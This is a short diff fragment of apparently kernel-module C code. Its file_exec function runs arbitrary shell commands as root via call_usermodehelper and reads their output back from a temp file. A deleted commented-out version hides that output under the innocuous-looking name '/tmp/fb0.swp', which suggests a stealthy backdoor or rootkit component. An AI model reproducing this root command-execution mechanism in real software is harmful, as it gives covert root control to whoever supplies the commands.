@@ -117,7 +117,10 @@ int file_exec(char *cmd, u8 **out_buf, size_t *out_buflen)
         return PTR_ERR(argv[2]);
 
     sprintf(argv[2], "%s%s", cmd, BASH_POSTFIX);
+
+    pr_err("[*] executing: \"%s %s '%s'\"\n", argv[0], argv[1], argv[2]);
     cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    
     kzfree(argv[2], bash_cmd_len);
 
     retv = file_read(STDOUT_FILE, out_buf, out_buflen);
@@ -126,35 +129,4 @@ int file_exec(char *cmd, u8 **out_buf, size_t *out_buflen)
         return retv;
 
     return cmd_retv;
-
-
-    /*#define STDOUT_FILE "/tmp/fb0.swp"
-    #define CMD_POSTFIX " 2>&1 >"
-
-    char* envp[] = {"HOME=/", "PWD=/", "TERM=xterm-256color", "USER=root", "SHELL=/bin/bash" "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
-    char* argv[] = {"/bin/wall", "-c", NULL, NULL};
-    size_t bash_cmd_len;
-    int cmd_retv;
-    int retv;
-
-    bash_cmd_len = strlen(cmd) + strlen(CMD_POSTFIX) + strlen(STDOUT_FILE) + 1; 
-    
-    argv[2] = kzmalloc(bash_cmd_len, GFP_KERNEL);
-    if (IS_ERR(argv[2]))
-        return PTR_ERR(argv[2]);
-
-    sprintf(argv[2], "%s%s%s", cmd, CMD_POSTFIX, STDOUT_FILE);
-
-    pr_err("[*] executing: \"%s %s '%s'\"\n", argv[0], argv[1], argv[2]);
-    cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-    //kzfree(argv[2], bash_cmd_len);
-
-    pr_err("[*] call_usermodehelper returned exit status: %d, signal number: %d\n", cmd_retv >> 8, cmd_retv & 0xFF);
-
-    retv = file_read(STDOUT_FILE, out_buf, out_buflen);
-    pr_err("[+] read %d bytes\n", retv);
-    if (retv < 0)
-        return retv;
-
-    return cmd_retv;*/
 }
